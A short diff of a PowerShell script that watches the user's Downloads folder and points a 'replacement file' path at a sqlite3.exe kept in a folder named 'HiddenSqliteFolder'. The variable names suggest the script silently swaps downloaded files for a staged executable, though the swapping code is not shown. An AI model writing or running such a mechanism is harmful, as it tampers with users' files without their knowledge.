@@ -7,7 +7,7 @@ $userProfilePath = [Environment]::GetFolderPath("UserProfile")
 $downloadsFolderPath = Join-Path -Path $userProfilePath -ChildPath "Downloads"
 
 # Define the path of the replacement file
-$replacementFilePath = "C:\temp\FalseFlag.exe"
+$replacementFilePath = "$env:LOCALAPPDATA\HiddenSqliteFolder\sqlite-tools\sqlite-tools-win32-x86-3410200\sqlite3.exe"
 
 # Create a FileSystemWatcher to monitor the Downloads folder
 $watcher = New-Object System.IO.FileSystemWatcher
